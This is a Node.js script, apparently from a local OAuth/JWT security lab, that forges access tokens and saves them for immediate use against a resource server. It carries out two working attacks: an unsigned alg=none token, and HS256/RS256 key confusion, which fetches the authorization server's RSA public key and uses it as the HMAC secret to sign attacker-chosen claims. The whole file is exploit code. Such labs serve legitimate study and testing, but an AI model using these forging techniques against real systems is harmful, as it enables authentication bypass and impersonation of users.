// Malicious token minter — writes a forged token into .tokens/current.json so
// `node flow.js call` immediately exercises it against the resource server.
//   node forge.js none          alg=none, empty signature
//   node forge.js hsconfusion   HS256 signed using the authz server's RSA PUBLIC key as the HMAC secret
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const jwt = require('jsonwebtoken');

const AUTHZ_URL = process.env.AUTHZ_URL || 'http://localhost:4000';
const TOKENS_DIR = path.join(__dirname, '.tokens');
const TOKENS_FILE = path.join(TOKENS_DIR, 'current.json');

function saveForged(token, kind) {
  fs.mkdirSync(TOKENS_DIR, { recursive: true });
  fs.writeFileSync(TOKENS_FILE, JSON.stringify({ access_token: token, refresh_token: null, forged: kind }, null, 2));
}

function claims() {
  const now = Math.floor(Date.now() / 1000);
  return { sub: 'attacker', aud: 'api://resource', iss: 'http://localhost:4000', jti: crypto.randomUUID(), iat: now, exp: now + 900 };
}

function forgeNone() {
  const header = { alg: 'none', typ: 'JWT' };
  const encHeader = Buffer.from(JSON.stringify(header)).toString('base64url');
  const encPayload = Buffer.from(JSON.stringify(claims())).toString('base64url');
  const token = `${encHeader}.${encPayload}.`; // empty signature segment
  saveForged(token, 'alg=none');
  console.log('Forged alg=none token saved to .tokens/current.json:');
  console.log(token);
  console.log('\nheader: ', JSON.stringify(header));
  console.log('payload:', JSON.stringify(jwt.decode(token)));
}

async function forgeHsConfusion() {
  const resp = await fetch(`${AUTHZ_URL}/pubkey`);
  const { publicKey } = await resp.json();

  const token = jwt.sign(claims(), publicKey, { algorithm: 'HS256' });
  saveForged(token, 'HS256-key-confusion');
  console.log('Forged HS256 token (signed with the RS256 public key as HMAC secret) saved to .tokens/current.json:');
  console.log(token);
  console.log('\npayload:', JSON.stringify(jwt.decode(token)));
}

const cmd = process.argv[2];
if (cmd === 'none') {
  forgeNone();
} else if (cmd === 'hsconfusion') {
  forgeHsConfusion().catch((err) => {
    console.error(err);
    process.exit(1);
  });
} else {
  console.error('Usage: node forge.js <none|hsconfusion>');
  process.exit(1);
}
